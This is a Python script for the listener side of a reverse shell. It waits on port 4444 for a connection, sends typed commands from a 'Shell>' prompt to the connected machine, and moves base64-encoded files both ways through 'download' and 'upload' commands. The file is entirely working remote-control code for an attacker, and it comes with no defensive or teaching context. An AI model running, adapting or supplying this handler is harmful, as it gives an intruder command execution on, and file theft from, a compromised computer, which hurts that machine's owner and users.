import socket
import json
import base64

def reliable_send(data, conn):
    json_data = json.dumps(data)
    conn.send(json_data.encode())

def reliable_recv(conn):
    data = b""
    while True:
        try:
            data += conn.recv(1024)
            return json.loads(data.decode())
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Upload successful."

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

def server():
    host = "0.0.0.0"  # Listen on all interfaces or specify IP
    port = 4444

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    print(f"[+] Listening on {host}:{port} ...")
    conn, addr = sock.accept()
    print(f"[+] Connection from {addr}")

    while True:
        command = input("Shell> ").strip()
        if command == "":
            continue
        reliable_send(command, conn)

        if command == "exit":
            break

        elif command[:3] == "cd ":
            # Just send the cd command, client handles path change
            output = reliable_recv(conn)
        elif command[:8] == "download":
            # download filename
            file_name = command[9:].strip()
            file_data = reliable_recv(conn)
            if file_data.startswith("[-] Error"):
                output = file_data
            else:
                with open(file_name, "wb") as f:
                    f.write(base64.b64decode(file_data))
                output = f"[+] Downloaded file saved as {file_name}"
        elif command[:6] == "upload":
            # upload filename
            file_name = command[7:].strip()
            try:
                with open(file_name, "rb") as f:
                    file_content = base64.b64encode(f.read()).decode()
                reliable_send(file_content, conn)
                output = reliable_recv(conn)
            except FileNotFoundError:
                print("[-] File not found.")
                reliable_send("", conn)  # send empty content
                output = reliable_recv(conn)
        else:
            output = reliable_recv(conn)
        
        print(output)

    conn.close()
    sock.close()

if __name__ == "__main__":
    server()
